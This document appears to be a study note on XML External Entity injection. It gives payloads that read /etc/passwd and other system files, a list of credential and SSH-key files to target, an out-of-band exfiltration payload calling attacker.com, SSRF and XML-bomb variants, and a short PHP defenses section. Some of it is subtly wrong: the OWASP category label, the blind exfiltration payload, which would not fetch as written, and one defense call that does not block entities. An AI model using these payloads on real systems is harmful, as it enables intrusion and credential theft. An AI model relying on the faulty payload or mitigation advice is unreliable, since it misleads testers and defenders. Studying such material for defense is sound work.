#webapplications

OWASP A05 (Injection). XML External Entity injection: a malformed XML document declares an external entity that points to a file the attacker wants to read. The parser resolves the entity and leaks the file content.

## How it works
```xml
<!-- Normal XML -->
<course>
  <code>CYBR401</code>
</course>

<!-- Malicious: declare an external entity -->
<!DOCTYPE course [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<course>
  <code>&xxe;</code>
</course>
```

When the XML parser processes this, it:
1. Sees the `ENTITY` declaration
2. Resolves `SYSTEM "file:///etc/passwd"` (reads the file)
3. Replaces `&xxe;` with the file contents
4. Returns the result to the application

**The file is read server-side and returned in the response.**

## Testing workflow

1. **Identify an XML input** — anywhere the app accepts XML:
   ```
   POST /api/upload Content-Type: application/xml
   POST /api/config (JSON body that gets parsed as XML)
   SVG upload (SVG is XML)
   SOAP service
   ```

2. **Test basic XXE** — inject a harmless external entity first:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "file:///etc/hostname">
   ]>
   <test>&xxe;</test>
   ```

3. **Read the response** — the file content should appear:
   - Success: Response contains the hostname/file contents
   - Blocked: Entity declaration rejected or empty response
   - Parsing error: Parser caught the XXE but errored

4. **Escalate to data exfiltration** — common files to target:
   ```
   /etc/passwd          (user list)
   /etc/shadow          (password hashes, needs root)
   ~/.ssh/id_rsa        (SSH key)
   /app/config.php      (database credentials)
   /app/.env            (secrets)
   C:\windows\win.ini   (Windows config)
   ```

## Blind XXE — when the response doesn't show the file

If the server doesn't echo back the entity, you can still exfiltrate via **out-of-band** (OOB) requests:

```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY oob "http://attacker.com/?data=&xxe;">
]>
<test>&oob;</test>
```

The server tries to fetch your URL, encoding the file contents as a query parameter. Check your attacker server logs for the request with the leaked data.

## Common gotchas

| Gotcha | What goes wrong | Fix |
| --- | --- | --- |
| Doctype declarations blocked | `<!DOCTYPE` is filtered | Try SVG namespace declarations or CDATA sections |
| File doesn't exist or permission denied | Response is empty or error | Verify the file path; use `/etc/passwd` for testing (readable on Unix) |
| Entity encoding issues | Special chars (like `&`, `<`) break the response | Use CDATA: `<![CDATA[file contents]]>` to wrap |
| Parser disabled external entities | XXE is patched in the library | Check app behavior; modern parsers disable by default |

## XXE variants
| Variant | What it does | When to use |
| --- | --- | --- |
| **Basic XXE** | Entity replaced in response | File content appears in visible output |
| **Blind XXE** | No output, but parser resolves the entity | Server reads the file (data exfiltrated out-of-band) |
| **SSRF via XXE** | External entity points to internal URL | Read data from internal services (localhost:8080, 169.254.169.254) |
| **Billion Laughs / XML bomb** | Nested entity expansion consumes memory | DoS attack; not for data exfiltration |

## Defenses
```php
// Disable XXE in PHP
$dom = new DOMDocument();
$dom->load($xml_file, LIBXML_NOENT | LIBXML_DTDLOAD);  // UNSAFE

// Correct: disable external entities
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->load($xml_file);  // External entities blocked

// Or in XML parser config
XMLReader::setRelaxNGSchema(null);  // Disable external schema
```

Most modern parsers disable external entity resolution by default — if XXE works, the app is using an outdated or misconfigured library.
